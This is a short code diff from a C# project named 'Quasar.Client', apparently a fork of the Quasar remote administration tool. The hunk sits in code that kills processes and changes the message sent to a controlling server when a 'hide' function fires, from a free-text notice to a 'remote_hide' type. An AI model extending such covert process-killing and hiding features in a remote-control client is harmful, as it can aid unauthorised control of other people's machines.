@@ -113,7 +113,7 @@ namespace Quasar.Client
                             //Console.WriteLine($"Failed to kill PID {proc.Id}: {ex.Message}");
                         }
                     }
-                    _connectClient?.Send(new NotifyMessageToServer { Message = "Hide Function is triggered by custoemr!\nThere is no RedText and AutoTyper." });
+                    _connectClient?.Send(new NotifyMessageToServer { Type = "remote_hide" });
                     
                 }
             }
